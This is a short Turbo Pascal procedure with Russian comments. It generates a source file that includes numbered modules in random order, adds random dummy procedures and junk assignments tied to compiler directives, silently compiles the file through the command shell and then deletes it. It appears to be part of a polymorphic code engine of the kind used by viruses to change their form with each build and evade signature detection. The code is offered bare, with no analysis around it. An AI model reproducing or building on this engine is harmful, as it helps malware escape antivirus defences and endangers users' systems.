procedure TPPE_6;
var t:text;
    a,i,j:{$IFOPT D+}integer{$ELSE}byte{$ENDIF};
    m:array[1..MaxInc] of byte;
label lab;
begin
{$IFOPT S+}for i:=1 to MaxInc do m[i]:=0;{$ENDIF}
assign(t,'_tppe_.pas');rewrite(t);
{$IFOPT V+}Junk1:=Use+'';{$ENDIF}
writeln(t,'{$I tpped.inc}');
{$IFOPT N-}Junk2:=77;{$ENDIF}
writeln(t,Use);
{$IFOPT I+}Junk3:=not True;{$ENDIF}
writeln(t,'const ComLen=',ComLen,';');
{$IFOPT S-}for i:=1 to MaxInc do m[i]:=0;{$ENDIF}
writeln(t,'{$I tppe0.inc}');
{$IFOPT B+}Junk1:='ft';{$ENDIF}
for i:=1 to MaxInc do {по кол-ву подключаемых файлов}
  begin
lab:
  a:=random(MaxInc)+1;
  {$IFOPT F+}Junk2:=33-14;{$ENDIF}
  if m[a]=0 then
    begin
    m[a]:=1;
    {$IFOPT B-}Junk1:='MZ';{$ENDIF}
    for j:=1 to random(3)+1 do {создаем пустышки}
      begin
      {$IFOPT L+}Junk3:=True;{$ENDIF}
      TPPE_4;
      {$IFOPT P-}Junk1:='';{$ENDIF}
      writeln(t,'{$I tppe',Dummy+MaxInc,'.inc}');
      end
    end
  else goto lab;
  {$IFOPT T+}Junk2:=0;{$ENDIF}
  writeln(t,'{$I tppe',a,'.inc}');
  end;
writeln(t,'begin');
{$IFOPT V-}writeln(t,'Fake:=false;');{$ENDIF}
writeln(t,'Starting;');
{$IFOPT V+}writeln(t,'Fake:=false;');{$ENDIF}
writeln(t,'if Fake then',Chr(13),Chr(10),'  begin');
for i:=1 to Dummy do writeln(t,'  tppe',i+MaxInc,';');
{$IFOPT D-}Junk3:=False or True;{$ENDIF}
writeln(t,'  end;',Chr(13),Chr(10),'end.');
close(t);
{$IFOPT S+}Junk2:=100;{$ENDIF}
exec(Command,'/c '+Compile+' _tppe_.pas>nul');
erase(t);
end;